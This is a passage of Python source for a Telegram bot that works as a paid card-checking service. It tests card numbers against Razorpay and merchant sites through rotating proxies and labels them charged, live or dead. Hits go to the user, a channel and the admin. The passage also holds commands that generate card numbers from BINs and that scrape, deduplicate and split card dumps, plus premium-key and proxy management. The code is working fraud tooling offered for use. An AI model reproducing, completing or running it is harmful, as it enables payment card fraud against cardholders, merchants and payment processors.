        await event.reply(premium_emoji("❌ Invalid format!\nUse: <code>/rz 4097580790933573|06|2030|208</code>"), parse_mode='html')
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available!"))
        return
    
    card = cards[0]
    status_msg = await event.reply(premium_emoji("⚡ **Razorpay Checking...**"), parse_mode='html')
    
    try:
        result = await check_card_razorpay(card, random.choice(proxies))
        update_daily_usage(user_id)
        
        if result['status'] in ['Charged', 'Approved']:
            try:
                sender = await event.get_sender()
                username = sender.username or f"user_{user_id}"
            except:
                username = f"user_{user_id}"
            await send_hit_to_user(user_id, result)
            await send_hit_to_channel(user_id, result, username)
            await send_hit_to_admin(result, user_id, result['status'])
        
        bin_info = await get_bin_info(card)
        
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "PAID ✅"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "LIVE ✅"
        else:
            status_emoji = "❌"
            status_text = "DEAD ❌"
        
        response = f"""{status_emoji} <b>RAZORPAY RESULT</b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 CC:</b> <tg-spoiler><code>{card}</code></tg-spoiler>
<b>Status:</b> {status_emoji} {status_text}
<b>📝 Response:</b> {result.get('message', 'Unknown')[:80]}
━━━━━━━━━━━━━━━━━━━━
<b>💰 Amount:</b> ₹{result.get('price', '1')}
<b>🏦 Bank:</b> {bin_info.get('bank', '-')}
<b>🌍 Country:</b> {bin_info.get('country', '-')} {bin_info.get('flag', '')}
<b>⏳ Time:</b> {get_time()}"""
        
        await status_msg.edit(premium_emoji(response), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# BULK CHECK - /chk
# ============================================================

@bot.on(events.NewMessage(pattern='/chk'))
@ban_check
@require_verified
async def bulk_check(event):
    user_id = event.sender_id
    save_user(user_id)
    
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji(f"""<b>🔒 PREMIUM ONLY</b>
━━━━━━━━━━━━━━━━━━━━
Bulk check is for premium users only!
<b>👑 Contact:</b> {OWNER_NAME}"""), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file!"))
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file!"))
        return
    
    await process_file(event, user_id, reply)

# ============================================================
# RAZORPAY BULK CHECK
# ============================================================

@bot.on(events.NewMessage(pattern='/rzchk'))
@ban_check
@require_verified
async def rz_bulk_check(event):
    user_id = event.sender_id
    save_user(user_id)
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Admin only!**"))
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file!"))
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file!"))
        return
    
    status_msg = await event.reply(premium_emoji("📥 **Processing Razorpay file...**"), parse_mode='html')
    
    try:
        file_path = await reply.download_media()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(file_path)
        
        cards = extract_cc(content)
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found!"))
            return
        
        cards = cards[:1000]
        proxies = load_proxies()
        
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available!"))
            return
        
        results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards)}
        
        for i, card in enumerate(cards):
            result = await check_card_razorpay(card, random.choice(proxies))
            
            if result['status'] == 'Charged':
                results['charged'].append(result)
                await send_hit_to_user(user_id, result)
            elif result['status'] == 'Approved':
                results['approved'].append(result)
                await send_hit_to_user(user_id, result)
            else:
                results['dead'].append(result)
            
            if i % 10 == 0:
                await status_msg.edit(premium_emoji(f"⚡ Processing: {i+1}/{len(cards)}"))
        
        final = f"""<b>✅ RAZORPAY CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 Charged:</b> <code>{len(results['charged'])}</code>
<b>🔥 Live:</b> <code>{len(results['approved'])}</code>
<b>❌ Dead:</b> <code>{len(results['dead'])}</code>
<b>📊 Total:</b> <code>{len(cards)}</code>"""
        
        await status_msg.edit(premium_emoji(final), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# PROCESS FILE
# ============================================================

async def process_file(event, user_id, msg):
    try:
        status_msg = await event.reply(premium_emoji("📥 **Processing file...**"), parse_mode='html')
        
        file_path = await msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
        
        cards = extract_cc(content)
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found!"))
            return
        
        if is_admin(user_id):
            if len(cards) > 100000:
                cards = cards[:100000]
        elif is_premium(user_id):
            if len(cards) > 10000:
                cards = cards[:10000]
        else:
            if len(cards) > 2000:
                cards = cards[:2000]
        
        sites = load_sites()
        proxies = load_proxies()
        
        if not sites or not proxies:
            await status_msg.edit(premium_emoji("❌ No sites or proxies available!"))
            return
        
        await status_msg.edit(premium_emoji(f"⚡ **Checking {len(cards)} cards...**"), parse_mode='html')
        
        results = {
            'charged': [],
            'approved': [],
            'dead': [],
            'errors': [],
            'total': len(cards),
            'checked': 0,
            'start_time': time.time()
        }
        
        session_key = f"{user_id}_{status_msg.id}"
        active_sessions[session_key] = {'stopped': False, 'results': results}
        
        for i, card in enumerate(cards):
            if active_sessions.get(session_key, {}).get('stopped', False):
                break
            
            result = await check_card_with_retry(card, sites, proxies, max_retries=8)
            results['checked'] += 1
            results['last_result'] = result
            
            if result['status'] == 'Charged':
                results['charged'].append(result)
                await send_hit_to_user(user_id, result)
                await send_hit_to_admin(result, user_id, 'Charged')
            elif result['status'] == 'Approved':
                results['approved'].append(result)
                await send_hit_to_user(user_id, result)
                await send_hit_to_admin(result, user_id, 'Approved')
            elif result['status'] == 'Dead':
                results['dead'].append(result)
            else:
                results['errors'].append(result)
            
            if i % 10 == 0 or i == len(cards) - 1:
                await update_progress(user_id, status_msg.id, results, results['checked'], "User")
        
        elapsed = int(time.time() - results['start_time'])
        mins = elapsed // 60
        secs = elapsed % 60
        
        final = f"""<b>✅ CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 Total:</b> <code>{results['total']}</code>
<b>⏱️ Time:</b> <code>{mins}m {secs}s</code>
━━━━━━━━━━━━━━━━━━━━
<b>💎 Charged:</b> <code>{len(results['charged'])}</code>
<b>🔥 Live:</b> <code>{len(results['approved'])}</code>
<b>❌ Dead:</b> <code>{len(results['dead'])}</code>
<b>⚠️ Errors:</b> <code>{len(results['errors'])}</code>"""
        
        await status_msg.edit(premium_emoji(final), parse_mode='html')
        
        if session_key in active_sessions:
            del active_sessions[session_key]
            
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# PLAN COMMAND
# ============================================================

@bot.on(events.NewMessage(pattern='/plan'))
@ban_check
async def plan_cmd(event):
    user_id = event.sender_id
    
    if is_admin(user_id):
        plan = "👑 ADMIN - UNLIMITED"
        expiry = "∞ Lifetime"
    elif is_premium(user_id):
        plan = "💎 PREMIUM"
        lines = read_lines(PREMIUM_FILE)
        expiry = "Active"
        for line in lines:
            if str(user_id) in line:
                try:
                    _, exp = line.split('|', 1)
                    expiry = exp.strip()
                except:
                    pass
    else:
        plan = "⭐ FREE"
        expiry = "N/A"
    
    usage = get_daily_usage(user_id)
    
    msg = f"""<b>📊 YOUR PLAN</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Plan:</b> {plan}
<b>⏳ Expiry:</b> <code>{expiry}</code>
<b>📊 Today's Usage:</b> <code>{usage}/150</code>"""
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ============================================================
# REDEEM COMMAND - SINGLE KEY + MULTI-DEVICE
# ============================================================

@bot.on(events.NewMessage(pattern='/redeem'))
@ban_check
async def redeem_cmd(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/redeem KEY</code>"), parse_mode='html')
        return
    
    key = parts[1].strip().upper()
    
    # Try multi-device key first
    result = redeem_multi_device_key(key, user_id)
    
    if result == "success":
        await event.reply(premium_emoji(f"""<b>🎉 PREMIUM ACTIVATED!</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 Status:</b> PREMIUM ACTIVE
<b>👤 User:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Benefits:</b>
• Unlimited Checks
• No Daily Limit
• Bulk Check Support"""), parse_mode='html')
        return
    
    if result == "already_premium":
        await event.reply(premium_emoji("⚠️ **You are already premium!**"))
        return
    
    if result == "device_limit_reached":
        await event.reply(premium_emoji("❌ **Device limit reached for this key!**"))
        return
    
    if result == "used":
        await event.reply(premium_emoji("❌ **Key already used by you!**"))
        return
    
    # Try regular key
    lines = read_lines(KEYS_FILE)
    new_lines = []
    found = False
    
    for line in lines:
        if '|' in line:
            k, days = line.split('|', 1)
            if k.strip().upper() == key:
                found = True
                expiry = datetime.now() + timedelta(days=int(days.strip()))
                premium_lines = read_lines(PREMIUM_FILE)
                premium_lines.append(f"{user_id}|{expiry.strftime('%Y-%m-%d %H:%M:%S')}")
                write_lines(PREMIUM_FILE, premium_lines)
            else:
                new_lines.append(line)
    
    if found:
        write_lines(KEYS_FILE, new_lines)
        await event.reply(premium_emoji(f"""<b>🎉 PREMIUM ACTIVATED!</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 Status:</b> PREMIUM ACTIVE
<b>👤 User:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Benefits:</b>
• Unlimited Checks
• No Daily Limit
• Bulk Check Support"""), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ **Invalid or expired key!**\nContact {OWNER_NAME}"))

# ============================================================
# KEY STATS
# ============================================================

@bot.on(events.NewMessage(pattern='/keystats'))
async def key_stats_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/keystats KEY</code>"), parse_mode='html')
        return
    
    key = parts[1].strip()
    key_info = get_key_info(key)
    
    if not key_info:
        await event.reply(premium_emoji("❌ Key not found!"))
        return
    
    devices_used = key_info.get('used', 0)
    device_limit = key_info.get('limit', 0)
    days = key_info.get('days', 0)
    created = key_info.get('created', 'Unknown')
    users_list = key_info.get('users', [])
    
    progress = "🟢" * devices_used + "⚪" * (device_limit - devices_used)
    users_text = "\n".join([f"<code>{uid}</code>" for uid in users_list]) if users_list else "No users yet"
    
    msg = f"""<b>📊 KEY STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 Key:</b> <code>{key[:20]}...</code>
<b>💎 Plan:</b> {days} days
<b>📱 Devices:</b> {devices_used}/{device_limit}
<b>📊 Progress:</b> {progress}
<b>📅 Created:</b> {created}
━━━━━━━━━━━━━━━━━━━━
<b>👥 Redeemed Users:</b>
{users_text}
━━━━━━━━━━━━━━━━━━━━
<b>📈 Used:</b> {devices_used}/{device_limit} ({(devices_used/device_limit*100):.1f}%)"""
    
    await event.reply(premium_emoji(msg), parse_mode="html")

# ============================================================
# GENERATE CC
# ============================================================

@bot.on(events.NewMessage(pattern='/gen'))
@ban_check
@require_verified
async def gen_cmd(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium only!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/gen 601100 534109</code>"), parse_mode='html')
        return
    
    bins = []
    total = 1000
    
    for p in parts[1:]:
        if p.isdigit():
            if len(p) <= 6:
                bins.append(p)
            else:
                total = int(p)
    
    if not bins:
        await event.reply(premium_emoji("❌ Invalid BIN!"))
        return
    
    per_bin = max(1, total // len(bins))
    cards = []
    for b in bins:
        cards.extend(generate_cc(b, per_bin))
    
    cards = cards[:total]
    random.shuffle(cards)
    
    filename = f"gen_{user_id}_{int(time.time())}.txt"
    with open(filename, 'w') as f:
        f.write('\n'.join(cards))
    
    await event.reply(premium_emoji(f"📄 **{len(cards)} CC Generated**"), file=filename, parse_mode='html')
    os.remove(filename)

# ============================================================
# SCRAPE CC
# ============================================================

@bot.on(events.NewMessage(pattern='/scrape'))
@ban_check
@require_verified
async def scrape_cmd(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium only!"))
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file!"))
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file!"))
        return
    
    status = await event.reply(premium_emoji("🔄 **Scraping...**"), parse_mode='html')
    
    try:
        file_path = await reply.download_media()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(file_path)
        
        cards = extract_cc(content)
        unique = list(dict.fromkeys(cards))
        
        valid = []
        expired = 0
        for card in unique:
            try:
                _, _, year, _ = card.split('|')
                y = int(year) if len(year) == 4 else 2000 + int(year)
                if y >= 2026:
                    valid.append(card)
                else:
                    expired += 1
            except:
                valid.append(card)
        
        filename = f"scraped_{user_id}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(valid))
        
        await status.edit(premium_emoji(f"""<b>✅ SCRAPE COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 Found:</b> <code>{len(cards)}</code>
<b>🗑 Duplicates:</b> <code>{len(cards) - len(unique)}</code>
<b>⏰ Expired:</b> <code>{expired}</code>
<b>✅ Valid:</b> <code>{len(valid)}</code>"""), file=filename, parse_mode='html')
        
        os.remove(filename)
        
    except Exception as e:
        await status.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# SPLIT COMMAND
# ============================================================

@bot.on(events.NewMessage(pattern='/split'))
@ban_check
@require_verified
async def split_cmd(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium only!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/split 100</code> (cards per file)"), parse_mode='html')
        return
    
    try:
        per_file = int(parts[1])
    except:
        await event.reply(premium_emoji("❌ Invalid number!"))
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file!"))
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file!"))
        return
    
    status = await event.reply(premium_emoji("🔄 **Splitting...**"), parse_mode='html')
    
    try:
        file_path = await reply.download_media()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(file_path)
        
        cards = extract_cc(content)
        if not cards:
            await status.edit(premium_emoji("❌ No valid cards!"))
            return
        
        chunks = [cards[i:i+per_file] for i in range(0, len(cards), per_file)]
        
        sent = 0
        for i, chunk in enumerate(chunks, 1):
            filename = f"split_{i}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(chunk))
            
            await bot.send_message(user_id, f"📄 **Part {i}** - {len(chunk)} cards", file=filename)
            os.remove(filename)
            sent += 1
            await asyncio.sleep(0.5)
        
        await status.edit(premium_emoji(f"""<b>✅ SPLIT COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 Total:</b> <code>{len(cards)}</code>
<b>📦 Per File:</b> <code>{per_file}</code>
<b>📁 Files:</b> <code>{len(chunks)}</code>
<b>✅ Sent:</b> <code>{sent}</code>"""), parse_mode='html')
        
    except Exception as e:
        await status.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

# ============================================================
# SITE MANAGEMENT - USER
# ============================================================

@bot.on(events.NewMessage(pattern='/addsite'))
@ban_check
async def add_site(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/addsite https://site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    await add_user_site(user_id, site)
    await event.reply(premium_emoji(f"✅ **Site added!**\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
@ban_check
async def add_sites_alias(event):
    """Alias for /addsite"""
    await add_site(event)

@bot.on(events.NewMessage(pattern='/rmsite'))
@ban_check
async def remove_site(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmsite https://site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    if await remove_user_site(user_id, site):
        await event.reply(premium_emoji(f"✅ **Site removed!**\n<code>{site}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ Site not found!"))

@bot.on(events.NewMessage(pattern='/rmsites'))
@ban_check
async def rm_sites_alias(event):
    """Alias for /rmsite"""
    await remove_site(event)

@bot.on(events.NewMessage(pattern='/mysites'))
@ban_check
async def my_sites(event):
    user_id = event.sender_id
    sites = get_user_sites_sync(user_id)
    
    if not sites:
        await event.reply(premium_emoji("❌ No sites added!"))
        return
    
    text = "\n".join([f"{i+1}. {s[:60]}" for i, s in enumerate(sites[:20])])
    await event.reply(premium_emoji(f"<b>🌐 YOUR SITES</b>\n━━━━━━━━━━━━━━━━━━━━\n{text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearsites'))
@ban_check
async def clear_sites(event):
    user_id = event.sender_id
    
    if await clear_user_sites(user_id):
        await event.reply(premium_emoji("✅ **All sites cleared!**"))
    else:
        await event.reply(premium_emoji("❌ No sites to clear!"))

# ============================================================
# PROXY MANAGEMENT - USER
# ============================================================

@bot.on(events.NewMessage(pattern='/addproxy'))
@ban_check
async def add_proxy(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/addproxy ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    await add_user_proxy(user_id, proxy)
    await event.reply(premium_emoji(f"✅ **Proxy added!**\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy'))
@ban_check
async def remove_proxy(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmproxy ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    
    if await remove_user_proxy(user_id, proxy):
        await event.reply(premium_emoji(f"✅ **Proxy removed!**\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ Proxy not found!"))

@bot.on(events.NewMessage(pattern='/rmmyproxy'))
@ban_check
async def remove_my_proxy(event):
    user_id = event.sender_id
    parts = event.message.text.split()
    
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmmyproxy ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    
    if await remove_user_proxy(user_id, proxy):
        await event.reply(premium_emoji(f"✅ **Proxy removed!**\n\n`{proxy}`"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ Proxy not found in your list."))

@bot.on(events.NewMessage(pattern='/myproxies'))
@ban_check
async def my_proxies(event):
    user_id = event.sender_id
    proxies = await get_user_proxies_sync(user_id)
    
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies added!"))
        return
    
    text = "\n".join([f"{i+1}. {p[:40]}" for i, p in enumerate(proxies[:20])])
    await event.reply(premium_emoji(f"<b>📡 YOUR PROXIES</b>\n━━━━━━━━━━━━━━━━━━━━\n{text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
@ban_check
async def get_proxies(event):
    user_id = event.sender_id
    proxies = await get_user_proxies_sync(user_id)
    
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in your list."))
        return
    
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**"), file=filename)
        try: os.remove(filename)
        except: pass

@bot.on(events.NewMessage(pattern='/clearproxies'))
@ban_check
async def clear_proxies(event):
    user_id = event.sender_id
    proxies = await get_user_proxies_sync(user_id)
    
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies to clear!"))
        return
    
    data = await load_user_proxies()
    data.pop(str(user_id), None)
    await save_user_proxies(data)
    await event.reply(premium_emoji("✅ **All proxies cleared!**"))

# ============================================================
# RM PROXY INDEX - REMOVE BY INDEX
# ============================================================

@bot.on(events.NewMessage(pattern='/rmproxyindex'))
@ban_check
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium/Admin only!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    
    indices_str = parts[1].strip()
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return
    
    proxies = await get_user_proxies_sync(user_id)
    
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in your list!"))
        return
    
    removed = []
    new_proxies = []
    for i, proxy in enumerate(proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    
    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."))
        return
    
    data = await load_user_proxies()
    data[str(user_id)] = new_proxies
    await save_user_proxies(data)
    
    await event.reply(premium_emoji(f"✅ **Removed {len(removed)} proxies!**\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

# ============================================================
# CLEAR PROXY WITH BACKUP
# ============================================================

@bot.on(events.NewMessage(pattern='/clearproxy'))
@ban_check
async def clear_proxy_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium/Admin only!"))
        return
    
    proxies = await get_user_proxies_sync(user_id)
    count = len(proxies)
    
    if count == 0:
        await event.reply(premium_emoji("❌ Your proxy list is already empty."))
        return
    
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    backup_file = f"proxy_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        f.write("\n".join(proxies))
    
    await bot.send_message(user_id, f"📦 **Backup Created!** {count} proxies saved.", file=backup_file)
    try: os.remove(backup_file)
    except: pass
    
    data = await load_user_proxies()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_proxies(data)
    
    await event.reply(premium_emoji(f"""✅ **Your Proxies Cleared!**
    
🗑 Cleared: <code>{count}</code> proxies
📦 Backup: Sent above
📊 Your list is now empty.

💡 Use `/addproxy` to add new proxies manually.
💡 Use `/savetxt` to add via TXT file."""), parse_mode="html")

# ============================================================
# SAVETXT - ADD PROXIES FROM FILE
# ============================================================

@bot.on(events.NewMessage(pattern='/savetxt'))
@ban_check
async def add_proxy_from_txt(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium/Admin only!"))
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing proxies."))
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.document or not reply_msg.document.mime_type == 'text/plain':
        await event.reply(premium_emoji("❌ Please reply to a .txt file."))
        return
    
    status_msg = await event.reply(premium_emoji("📂 Reading proxies from TXT file..."))
    
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: os.remove(file_path)
        except: pass
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error reading file: {str(e)}"))
        return
    
    proxies_to_add = list(dict.fromkeys(line.strip() for line in content.splitlines() if line.strip()))
    
    if not proxies_to_add:
        await status_msg.edit(premium_emoji("❌ No valid proxies found in file."))
        return
    
    if len(proxies_to_add) > 1000:
        await status_msg.edit(premium_emoji(f"⚠️ Too many proxies ({len(proxies_to_add)}). Checking first 1000 only..."))
        proxies_to_add = proxies_to_add[:1000]
    
    await status_msg.edit(premium_emoji(f"🔄 Checking {len(proxies_to_add)} proxies..."))
    
    existing = await get_user_proxies_sync(user_id)
    added = 0
    dead = 0
    
    new_proxies = [p for p in proxies_to_add if p not in existing]
    skipped = len(proxies_to_add) - len(new_proxies)
    
    batch_size = 10
    for i in range(0, len(new_proxies), batch_size):
        batch = new_proxies[i:i + batch_size]
        
        if i > 0:
            await status_msg.edit(premium_emoji(f"🔄 Checking {i}/{len(new_proxies)} proxies... (✅ {added} alive | ❌ {dead} dead)"))
        
        results = await asyncio.gather(*[check_proxy(p) for p in batch], return_exceptions=True)
        
        for proxy, is_alive in zip(batch, results):
            if isinstance(is_alive, dict) and is_alive.get('alive'):
                await add_user_proxy(user_id, proxy)
                added += 1
            else:
                dead += 1
    
    total = len(await get_user_proxies_sync(user_id))
    
    final_msg = f"""
<b>✅ TXT PROXY CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
📄 Total in file: <code>{len(proxies_to_add)}</code>
✅ Alive Added: <code>{added}</code>
❌ Dead: <code>{dead}</code>
⏭ Already Exist: <code>{skipped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Total Your Proxies: <code>{total}</code>
"""
    
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

# ============================================================
# CHKPROXY - CHECK SINGLE PROXY
# ============================================================

@bot.on(events.NewMessage(pattern='/chkproxy'))
@ban_check
async def check_single_proxy(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium/Admin only!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/chkproxy ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    
    try:
        result = await test_proxy(proxy)
        
        if result.get('alive'):
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
            
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

# ============================================================
# ADMIN COMMANDS - SITE & PROXY MANAGEMENT
# ============================================================

@bot.on(events.NewMessage(pattern='/addst'))
async def admin_add_site(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/addst https://site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    sites = load_sites()
    if site in sites:
        await event.reply(premium_emoji("⚠️ Site already exists!"))
        return
    
    sites.append(site)
    write_lines(SITES_FILE, sites)
    await event.reply(premium_emoji(f"✅ **Site added to bot!**\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmst'))
async def admin_remove_site(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmst https://site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    sites = load_sites()
    if site not in sites:
        await event.reply(premium_emoji("❌ Site not found!"))
        return
    
    sites.remove(site)
    write_lines(SITES_FILE, sites)
    await event.reply(premium_emoji(f"✅ **Site removed!**\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpx'))
async def admin_add_proxy(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/addpx ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    proxies = load_proxies()
    
    if proxy in proxies:
        await event.reply(premium_emoji("⚠️ Proxy already exists!"))
        return
    
    proxies.append(proxy)
    write_lines(PROXY_FILE, proxies)
    await event.reply(premium_emoji(f"✅ **Proxy added to bot!**\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmpx'))
async def admin_remove_proxy(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmpx ip:port</code>"), parse_mode='html')
        return
    
    proxy = parts[1].strip()
    proxies = load_proxies()
    
    if proxy not in proxies:
